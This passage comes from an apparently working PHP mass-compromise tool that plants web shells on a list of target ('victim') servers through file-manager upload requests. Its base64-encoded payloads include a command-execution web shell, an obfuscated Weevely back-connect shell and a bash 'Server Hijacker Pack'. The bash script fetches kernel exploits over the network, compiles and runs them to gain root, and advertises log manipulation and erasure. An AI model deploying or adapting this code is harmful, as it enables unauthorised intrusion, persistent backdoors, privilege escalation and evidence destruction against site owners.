ZhY2U9ImFyaWFsIiBjb2xvcj0icmVkIiBzaXplPSI0Ij5HYXJ1ZGEgU2VjdXJpdHkgSGFja2VyPC9mb250PiZuYnNwOzxmb250IGZhY2U9ImFyaWFsIiBjb2xvcj0id2hpdGUiIHNpemU9IjQiPkNMSSBTaGVsbDwvZm9udD48L2I+DQo8YnI+PGEgaHJlZj0nP2xvZ291dD10cnVlJz5DbGljayBIZXJlIElmIFlvdSBXYW50IExvZ291dDwvYT4NCjw/DQppZigkX0dFVFsnbG9nb3V0J10gPT0gdHJ1ZSkgew0KdW5zZXQoJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pXSk7DQplY2hvICI8c2NyaXB0PndpbmRvdy5sb2NhdGlvbj0nPyc7PC9zY3JpcHQ+IjsNCn0NCj8+DQo8aGVhZD4NCjwvc3R5bGU+PC9oZWFkPjxib2R5PjwvdGFibGU+PGNlbnRlcj4NCjxmb250IGZhY2U9IlBpcmF0YSBPbmUiIHNpemU9IjEwIiBjb2xvcj0iYmxhY2siIHN0eWxlPSJ0ZXh0LXNoYWRvdzogMXB4IDBweCAuMWVtIGdvbGQsIC0xcHggMXB4IC4xZW0gZ29sZCwgLTFweCAtMXB4IC4xZW0gYmxhY2siPjxiPjxmb250IHNpemU9JzQnPjxmb250IHN0eWxlPSJ0ZXh0LXNoYWRvdzogMHB4IDBweCA2cHggcmdiKDI1NSwgMCwgMCksIDBweCAwcHggNXB4IHJnYigyNTUsIDAsIDApLCAwcHggMHB4IDVweCByZ2IoMjU1LCAwLCAwKTsgY29sb3I6IHJnYigyNTUsIDI1NSwgMjU1KTsgZm9udC13ZWlnaHQ6IGJvbGQ7Ij4NCjxmb250IHN0eWxlPSJjb2xvcjp5ZWxsb3c7c2l6ZT0iMiI7dGV4dC1hbGlnbjogY2VudGVyO2ZvbnQtZmFtaWx5OlBpcmF0YSBPbmU7IHRleHQtc2hhZG93OiAzcHggM3B4IDNweCB5ZWxsb3c7Ij4NCjwvY2VudGVyPjxicj48P3BocCBlY2hvICc8aDI+PGI+VXBsb2FkZXI8L2gyPicucGhwX3VuYW1lKCkuJzxicj48L2I+JztlY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj4nO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nO2lmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsgaWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpIHsgZWNobyAnPGI+VXBsb2FkIFN1Y2Nlc3MgISEhPC9iPjxicj48YnI+JzsgfSBlbHNlIHsgZWNobyAnPGI+VXBsb2FkIEZhaWwgISEhPC9iPjxicj48YnI+JzsgfX0/PjxvYmplY3QgZGF0YT0iaHR0cDovL2ZsYXNoLW1wMy1wbGF5ZXIubmV0L21lZGlhcy9wbGF5ZXJfbXAzLnN3ZiIgaGVpZ2h0PSIwIiB0eXBlPSJhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCIgd2lkdGg9IjAiPjxwYXJhbSBuYW1lPSJiZ2NvbG9yIiB2YWx1ZT0iI2ZmZmZmZiI+DQo8aDI+Q29tbWFuZCBMaW5lPC9oMj4NCjxmb3JtIGFjdGlvbj0iPD89JF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10/PiIgbWV0aG9kPSJQT1NUIj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ieCIgdmFsdWU9Ijw/PWh0bWxlbnRpdGllcygkX1BPU1RbJ3gnXSk/PiI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9ImNtZCI+PC9mb3JtPjxwcmU+PD8gZWNobyBgeyRfUE9TVFsneCddfWA7ID8+PC9wcmU+PD8gZGllKCk7ID8+";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done GSH CLI SHELL (gshcli.php) udah di tanam password : gsh1337 coba cek<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="y" value="PLANT Weevely Back Connect Shell">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['y']) {
	foreach($target as $korban) {
		$global = "ssh.php";
		$isi_nama_doang ="PD9waHANCiRodnNhPSJ5a3NJR3B2YVc0b1lYSnlZWGxmanNjMnhwWTJVb2pzSkdFc2pzSkdNb0pHRWpzcExUTXBLU2twS1R0bFkyaHZJQ2M4THljanN1SkdzdUp6NG5PMzBqcz0iOw0KJHNoaHU9IjNKbGpzY0dqc3hoWTJVanNvWVhKeVlYa29KeTlianNYbHgzUFZqc3h6WFM4bkxDY3ZYSE12Snlrc0lHRnljanNtRmpzNUtDY25qc0xDY3JKIjsNCiRoZ3F1ID0gc3RyX3JlcGxhY2UoImxoIiwiIiwibGhzbGh0bGhybGhfbGhyZXBsaGxsaGFsaGNsaGUiKTsNCiR0ZGtxPSJHanNFcFBqTWpzcGV5UnJqc1BTZG9NVE1qc3pOeWM3WldOb2J5QWpzblBDY3VKR3N1Sno0bk8yVjJZanNXd29ZanNtRnpaVFkwWDJqc1JsWTI5a1pTaHdjbVZuWCI7DQokcXd1bz0iSkdNOUoyanNOdmRXNTBKenNrWWpzVDBrWDBOUFQwdEpqc1JUdHBaaWhqc3laWE5qc2xkQ2drWVNqc2s5UFNqc2RuY3ljZ0ppWWdqc0pHTW9KIjsNCiR1aHlkID0gJGhncXUoInEiLCAiIiwgInFicWFxc2VxNjRxX3FkcWVxY3FvcWRlIik7DQokZXpvaSA9ICRoZ3F1KCJzIiwiIiwic2NzcmVzYXRzZV9zZnN1bnNjc3Rpb24iKTsNCiRqbWxxID0gJGV6b2koJycsICR1aHlkKCRoZ3F1KCJqcyIsICIiLCAkcXd1by4kdGRrcS4kc2hodS4kaHZzYSkpKTsgJGptbHEoKTsNCj8+"; 
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done Weevely Back Connect Shell (ssh.php) udah di tanam password : gsh1337 coba cek<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="z" value="PLANT Server Hijacker Pack">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['z']) {
	foreach($target as $korban) {
		$global = "hijack.sh";
		$isi_nama_doang = "Iw0KIy0tLS0tLS0tLS0tLS0NCiMgVGhpcyBpcyBDb3B5cmlnaHQgTGluZSBEb250IFJlbW92ZSBJZiBZb3UgUmVhbCBNYW4NCiMgVGhpcyBDb2RlIE5vdCBSZWFsbHkgUHVyZSBhIGZldyBwYXJ0IG9mIGNvZGUgaGVyZSANCiMgaXMgZGV2ZWxvcG1lbnQgZnJvbSBhbm90aGVyIGNvZGUgYnV0IHRoZSBpZGVhIGFuZCBhbGdvcml0aG0gaXMgcHVyZSANCiMgbWFkZSBieSBtZQ0KIyBJZiBZb3UgV2FubmEgUmVjb2RlIFRoaXMgRG9udCBGb3JnZXQgVG8gUHV0IFRoZSBTb3VyY2UgDQojLS0tLS0tLS0tLS0tLSANCiMgTmFtZSA6IFNlcnZlciBIaWphY2tlciBQYWNrIA0KIyBWZXJzaW9uIDogMS4wDQojIEF1dGhvciA6IFl1a2lub3NoaXRhIDQ3DQojIFRlYW0gOiBHYXJ1ZGEgU2VjdXJpdHkgSGFja2VyDQojLS0tLS0tLS0tLS0tLQ0KIyANCiMNCiMhL2Jpbi9iYXNoDQpsYWdpPSd5Jw0Kd2hpbGUgIFsgJGxhZ2kgPT0gJ3knIF0gfHwgWyAkbGFnaSA9PSAnWScgXTsNCmRvDQogICBjbGVhcg0KICAgZWNobyAiICBfX19fX19fICBfX19fX19fICAgICAgICAgICAgIg0KICAgZWNobyAiICggIF9fX18gXCggIF9fX18gXHxcICAgICAvfCAgIg0KICAgZWNobyAiIHwgKCAgICBcL3wgKCAgICBcL3wgKSAgICggfCBXZSBBcmUgTm90Ig0KICAgZWNobyAiIHwgfCAgICAgIHwgKF9fX19fIHwgKF9fXykgfCBVbmRlcmdyb3VkIEFueW1vcmUgIg0KICAgZWNobyAiIHwgfCBfX19fIChfX19fXyAgKXwgIF9fXyAgfCBXZSBBcmUgQSBTaW1wbGUgVGVhbSAiDQogICBlY2hvICIgfCB8IFxfICApICAgICAgKSB8fCAoICAgKSB8IEFuZCBPZmYgQ291cnNlICINCiAgIGVjaG8gIiB8IChfX18pIHwvXF9fX18pIHx8ICkgICAoIHwgTm8gQXJteSBDYW4gU3RvcCBPdXIgSWRlYSAiDQogICBlY2hvICIgKF9fX19fX18pXF9fX19fX18pfC8gICAgIFx8ICAiDQogICBlY2hvICIiICAgICAgICAgICAgICAgICAgICAgICAgDQogICBlY2hvIC1lICJcZVszMW09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IjsNCiAgIGVjaG8gIiINCiAgIGVjaG8gLWUgIlxlWzkybSAgR2FydWRhIFNlY3VyaXR5IEhhY2tlciAtIFRoZSBDb2RlcnMgVGVhbSINCiAgIGVjaG8gIiAgICAgICAgIFNlcnZlciBIaWphY2tlciBQYWNrIHYuMS4wIiANCiAgIGVjaG8gIiAgICAgICAgIENvZGVkIGJ5IFl1a2lub3NoaXRhIDQ3Ig0KICAgZWNobyAiIg0KICAgZWNobyAtZSAiXGVbMzFtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSI7DQogICBlY2hvICIiDQogICBlY2hvIC1lICJcZVszNG0gMS4gQXV0byBSMDB0aW5nIFxlWzMzbVtIaWphY2sgV2l0aCBLZXJuZWwgRXhwbG9pdF0iOw0KICAgZWNobyAtZSAiXGVbMzRtIDIuIEF1dG8gUjAwdCBEaXJ0eSBDb3cgRXhwbG9pdCBcZVszM21bU2FtZSBBcyBOdW1iZXIgMV0iOw0KICAgZWNobyAtZSAiXGVbMzRtIDMuIEFudGkgTG9nZ2luZyBcZVszM21bTG9nIE1hbmlwdWxhdGlvbl0iDQogICBlY2hvIC1lICJcZVszNG0gNC4gTG9nIEVyYXNlciBcZVszM21bQ2xlYW5pbmcgTG9nIEZvciBIaWRlIFlvdXIgQXNzXSI7DQogICBlY2hvIC1lICJcZVszNG0gNS4gRXhpdCBcZVszM21bUnVuIEZyb20gQWRtaW4gQW5kIFBvbGljZSA6cF0gICAgICI7DQogICBlY2hvICIiDQogICBlY2hvICAtZSAiXGVbMzFtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IjsNCiAgIHJlYWQgLXAgIiBZb3VyIENob2ljZSBbMS00XSA6IiBwaWw7DQogICBlY2hvICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iOw0KY2FzZSAkcGlsIGluIDEpDQojQWxsIGV4cGxvaXRzIGFyZSBzdWdnZXN0ZWQgYnkgIkxpbnV4IEV4cGxvaXQgU3VnZ2VzdGVyIiBhbmQgd2lsbCB1cGRhdGUgYWNjb3JkaW5nIHRvIGl0Lg0KI05hbWUgICAgIDogQXV0byBSb290DQojQXV0aG9yICAgOiBOaWxvdHBhbCBCaXN3YXMNCiNGYWNlYm9vayA6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9uaWxvdHBhbC5iaXN3YXMuNzMNCiNUd2l0dGVyICA6IGh0dHBzOi8vdHdpdHRlci5jb20vbmlsb3RwYWxoYWNrZXINCiNVU0FHRSAgICA6IGJhc2ggYXV0b3Jvb3Quc2gNCmVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSINCmVjaG8gIiAgICAgICAgICAgICAgQXV0byBSb290IEV4cGxvaXQgdi4gMi4wIg0KZWNobyAiICAgICAgICAgICAgIEFsZ29yaXRobSBieSBOaWxvdHBhbCBCaXN3YXMiDQplY2hvICIgICAgICAgICAgICBEZXZlbG9wZWQgYW5kIFVwZGF0ZSBFeHBsb2l0IGJ5Ig0KZWNobyAiICAgICAgICAgICAgICAgICAgIFl1a2lub3NoaXRhIDQ3Ig0KZWNobyAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ig0KDQpjaGVja3Jvb3QoKSB7DQppZiBbICQoaWQgLXUpID09IDAgXTsgdGhlbg0KZWNobw0KZWNobyAiU3VjY2Vzc2Z1bGx5IFIwMFQoZWQpLi4gaGF2ZSBmdW4gOikiDQppZD0kKGlkKQ0KZWNobyAiSUQgICAgID0+ICIgJGlkDQp3aG89JCh3aG9hbWkpDQplY2hvICJXSE9BTUkgPT4gIiAkd2hvDQpleGl0DQplbHNlDQplY2hvICIiDQplY2hvICJSMDBUaW5nLi4gd2FpdCINCnNsZWVwIDENCmZpDQp9DQplY2hvICJBdXRvIFIwMFRpbmcgc3RhcnQuLi4iDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC83NDQuYyAtTyBleHBsb2l0LmMNCmdjYyAtTzIgLWZvbWl0LWZyYW1lLXBvaW50ZXIgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzIwMTMuYyAtTyBleHBsb2l0LmMNCmdjYyBleHBsb2l0LmMgLW8gZXhwbG9pdA0KLi9leHBsb2l0DQpybSBleHBsb2l0ICYmIHJtIGV4cGxvaXQuYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGludXgvbG9jYWwvMTM5Ny5jIC1PIGV4cGxvaXQuYw0KZ2NjIC1vIGV4cGxvaXQgZXhwbG9pdC5jIC1zdGF0aWMgLU8yDQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC8xNjAuYyAtTyBleHBsb2l0LmMNCmdjYyAtTzMgLXN0YXRpYyAtZm9taXQtZnJhbWUtcG9pbnRlciBleHBsb2l0LmMgLW8gZXhwbG9pdA0KLi9leHBsb2l0DQpybSBleHBsb2l0ICYmIHJtIGV4cGxvaXQuYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGludXgvbG9jYWwvMTUwMjMuYyAtTyBleHBsb2l0LmMNCmdjYyBleHBsb2l0LmMgLW8gZXhwbG9pdA0KLi9leHBsb2l0DQpybSBleHBsb2l0ICYmIHJtIGV4cGxvaXQuYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGludXgvbG9jYWwvMjAzMS5jIC1PIGV4cGxvaXQuYw0KZ2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0IC1zdGF0aWMgLVdhbGwNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzIwMDQuYyAtTyBleHBsb2l0LmMNCmdjYyBleHBsb2l0LmMgLW8gZXhwbG9pdA0KLi9leHBsb2l0DQpybSBleHBsb2l0ICYmIHJtIGV4cGxvaXQuYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGludXgvbG9jYWwvMjAwNS5jIC1PIGV4cGxvaXQuYw0KZ2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0DQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC8yMDA2LmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQgLVdhbGwNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzUwOTIuYyAtTyBleHBsb2l0LmMNCmdjYyBleHBsb2l0LmMgLW8gZXhwbG9pdCAmICBnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQgLXN0YXRpYyAtV25vLWZvcm1hdA0KLi9leHBsb2l0DQpybSBleHBsb2l0ICYmIHJtIGV4cGxvaXQuYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGludXgvbG9jYWwvNTA5My5jIC1PIGV4cGxvaXQuYw0KZ2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0DQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC82ODUxLmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzE0ODE0LmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzE1Mjg1LmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzY4NTEuYyAtTyBleHBsb2l0LmMNCmdjYyBleHBsb2l0LmMgLW8gZXhwbG9pdA0KLi9leHBsb2l0DQpybSBleHBsb2l0ICYmIHJtIGV4cGxvaXQuYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGludXgvbG9jYWwvMTc3ODcuYyAtTyBleHBsb2l0LmMNCmdjYyBleHBsb2l0LmMgLW8gZXhwbG9pdCAtbHJ0DQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC8xNTkxNi5jIC1PIGV4cGxvaXQuYw0KZ2NjIC13IGV4cGxvaXQuYyAtbyBleHBsb2l0DQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC8xNTE1MC5jIC1PIGV4cGxvaXQuYw0KZ2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0DQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC8xNTAyNC5jIC1PIGV4cGxvaXQuYw0KZ2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0DQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC8xODQxMS5jIC1PIGV4cGxvaXQuYw0KZ2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0DQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC8yNTQ0NC5jIC1PIGV4cGxvaXQuYw0KZ2NjIC1PMiBleHBsb2l0LmMNCi4vYS5vdXQNCnJtIGEub3V0ICYmIHJtIGV4cGxvaXQuYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGludXgvbG9jYWwvMjYxMzEuYyAtTyBleHBsb2l0LmMNCmdjYyBleHBsb2l0LmMgLW8gZXhwbG9pdA0KLi9leHBsb2l0DQpybSBleHBsb2l0ICYmIHJtIGV4cGxvaXQuYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGluX2FtZDY0L2xvY2FsLzI3Mjk3LmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzMxMzQ2LmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzIwMTEuc2ggLU8gZXhwbG9pdC5zaA0KYmFzaCBleHBsb2l0LnNoDQpybSBleHBsb2l0LnNoICYmIHJtICouYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlL21hc3Rlci9wbGF0Zm9ybXMvbGludXgvbG9jYWwvODM2OS5zaCAtTyBleHBsb2l0LnNoDQpiYXNoIGV4cGxvaXQuc2gNCnJtIGV4cGxvaXQuc2ggJiYgcm0gKi5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F